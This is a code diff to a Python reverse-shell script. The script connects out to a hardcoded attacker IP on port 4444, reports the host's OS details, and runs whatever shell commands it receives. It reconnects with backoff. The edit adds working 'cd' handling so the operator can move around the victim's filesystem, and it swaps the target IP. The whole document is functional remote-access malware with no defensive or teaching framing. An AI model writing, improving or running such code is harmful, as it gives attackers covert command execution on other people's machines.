@@ -3,9 +3,11 @@ import subprocess
 import time
 import sys
 import platform
+import os
 
 def reverse_shell(attacker_ip, attacker_port):
     retry_delay = 1
+    current_dir = os.getcwd()  # Store current working directory
 
     while True:
         try:
@@ -13,7 +15,6 @@ def reverse_shell(attacker_ip, attacker_port):
             s.connect((attacker_ip, attacker_port))
             retry_delay = 1
 
-            # Send OS info immediately after connection
             os_info = platform.platform()
             s.send(os_info.encode())
 
@@ -25,11 +26,21 @@ def reverse_shell(attacker_ip, attacker_port):
                     s.close()
                     sys.exit(0)
 
-                try:
-                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                    output = result.stdout + result.stderr
-                except Exception as e:
-                    output = f"Command execution failed: {e}"
+                # Handle "cd" manually
+                if cmd.startswith("cd "):
+                    path = cmd[3:].strip()
+                    try:
+                        os.chdir(path)
+                        current_dir = os.getcwd()
+                        output = f"Changed directory to {current_dir}"
+                    except Exception as e:
+                        output = f"cd failed: {e}"
+                else:
+                    try:
+                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=current_dir)
+                        output = result.stdout + result.stderr
+                    except Exception as e:
+                        output = f"Command execution failed: {e}"
 
                 if not output:
                     output = "[No output]\n"
@@ -42,7 +53,7 @@ def reverse_shell(attacker_ip, attacker_port):
             retry_delay = min(retry_delay * 2, 60)
 
 if __name__ == "__main__":
-    ATTACKER_IP = "172.17.40.139"  # Change to your server's IP
-    ATTACKER_PORT = 4444           # Change to your server's port
+    ATTACKER_IP = "192.168.1.68"
+    ATTACKER_PORT = 4444
 
     reverse_shell(ATTACKER_IP, ATTACKER_PORT)
